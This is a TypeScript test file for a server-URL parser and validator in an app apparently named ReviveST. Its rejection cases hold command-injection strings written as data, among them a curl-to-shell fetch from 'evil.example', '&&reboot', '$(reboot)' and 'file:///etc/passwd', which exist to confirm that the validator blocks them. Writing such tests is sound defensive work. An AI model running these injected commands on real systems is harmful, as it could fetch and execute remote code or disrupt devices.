import { describe, expect, it } from "vite-plus/test";

import {
  DEFAULT_SERVER_URL,
  isSafeServerUrl,
  parseServerUrl,
} from "./server-url";

const parsed = (input: string) => {
  const result = parseServerUrl(input);
  return result.isOk() ? result.value : undefined;
};

describe("parseServerUrl", () => {
  it.each([
    [DEFAULT_SERVER_URL, DEFAULT_SERVER_URL],
    ["https://api.revivest.app/", DEFAULT_SERVER_URL],
    ["HTTPS://API.ReviveST.app", DEFAULT_SERVER_URL],
    ["https://api.revivest.app:443", DEFAULT_SERVER_URL],
    ["http://192.168.1.10:80/", "http://192.168.1.10"],
    ["http://192.168.1.10:443", "http://192.168.1.10:443"],
    ["https://revive.example.com:80", "https://revive.example.com:80"],
    ["http://nas:3000", "http://nas:3000"],
    ["http://my-nas.local:3000/", "http://my-nas.local:3000"],
    ["http://192.168.1.10:3000", "http://192.168.1.10:3000"],
    ["http://10.0.0.1", "http://10.0.0.1"],
    ["http://[fd00::10]:3000", "http://[fd00::10]:3000"],
    ["http://[FD00:0:0:0:0:0:0:10]", "http://[fd00:0:0:0:0:0:0:10]"],
    ["http://[::]:8080", "http://[::]:8080"],
    ["https://revive.example.com:1", "https://revive.example.com:1"],
    ["https://revive.example.com:65535", "https://revive.example.com:65535"],
  ])("accepts %j as %s", (input, origin) => {
    expect(parsed(input)).toBe(origin);
  });

  it.each([
    // Shell and telnet command injection
    "https://a.example;sys reboot",
    'https://";curl evil.example|sh"',
    "https://a.example|sh",
    "https://a.example&&reboot",
    "https://$(reboot).example",
    "https://`reboot`.example",
    "https://a.example$IFS",
    "https://a'.example",
    'https://a".example',
    "https://a.example\nsys reboot",
    "https://a.example\r",
    "https://a.example\t",
    "https://a .example",
    " https://a.example",
    "https://a.example ",
    "https://a.example:3000 reboot",
    "https://<a>.example",
    "https://a\\b.example",
    "https://a_b.example",
    "https://a%20b.example",
    "https://ü.example",
    // Not an origin
    "https://a.example/marge",
    "https://a.example//",
    "https://a.example/?",
    "https://a.example?x=1",
    "https://a.example#top",
    "https://a.example/#",
    "https://user:pass@a.example",
    "https://user@a.example",
    "https://a.example@b.example",
    // Malformed
    "",
    "a.example",
    "//a.example",
    "ftp://a.example",
    "file:///etc/passwd",
    "mailto:a@b.example",
    "https:/a.example",
    "https://",
    "https://.example",
    "https://a..example",
    "https://a.example.",
    "https://-a.example",
    "https://a-.example",
    `https://${"a".repeat(64)}.example`,
    // IP addresses only as dotted quads
    "https://1.2.3",
    "https://1.2.3.4.5",
    "https://256.1.1.1",
    "https://192.168.01.1",
    "https://3232235777",
    "https://0x7f.1",
    "https://example.123",
    // IPv6: bracketed, no zone or embedded IPv4
    "https://fd00::10",
    "https://[fd00::10",
    "https://[fd00::10]]",
    "https://[fd00:::10]",
    "https://[fd00::1::2]",
    "https://[1:2:3:4:5:6:7:8:9]",
    "https://[1:2:3:4:5:6:7]",
    "https://[1:2:3:4::5:6:7:8]",
    "https://[12345::1]",
    "https://[fe80::1%25en0]",
    "https://[::ffff:192.168.1.10]",
    "https://[]",
    // Ports
    "https://a.example:",
    "https://a.example:0",
    "https://a.example:65536",
    "https://a.example:99999",
    "https://a.example:080",
    "https://a.example:-1",
    "https://a.example:3000:3000",
    "https://a.example:http",
  ])("rejects %j", (input) => {
    expect(parseServerUrl(input).isErr()).toBe(true);
  });

  it.each([
    "http://localhost",
    "http://LOCALHOST:3000",
    "http://api.localhost",
    "http://127.0.0.1:3000",
    "http://127.1.2.3",
    "http://[::1]:3000",
    "http://[0:0:0:0:0:0:0:1]",
    "http://[::ffff:7f00:1]",
  ])("rejects the loopback address %j", (input) => {
    const result = parseServerUrl(input);
    expect(result.isErr() && result.error).toMatch(/localhost/);
  });

  // iOS only allows cleartext HTTP to these (`NSAllowsLocalNetworking`).
  it.each([
    "http://revive.example.com",
    "http://nas.home.arpa:3000",
    "http://nas.lan",
  ])("rejects plain http to %j, outside the local network", (input) => {
    const result = parseServerUrl(input);
    expect(result.isErr() && result.error).toMatch(/https:\/\//);
  });
});

describe("isSafeServerUrl", () => {
  it.each([
    DEFAULT_SERVER_URL,
    "http://192.168.1.10:3000",
    "http://[fd00::10]",
  ])("accepts the origin %s", (url) => {
    expect(isSafeServerUrl(url)).toBe(true);
  });

  it.each([
    `${DEFAULT_SERVER_URL}/`,
    "HTTPS://api.revivest.app",
    "https://api.revivest.app:443",
    "http://a.example;reboot",
    "http://localhost:3000",
    "",
  ])("rejects %j, not a normalised origin", (url) => {
    expect(isSafeServerUrl(url)).toBe(false);
  });
});
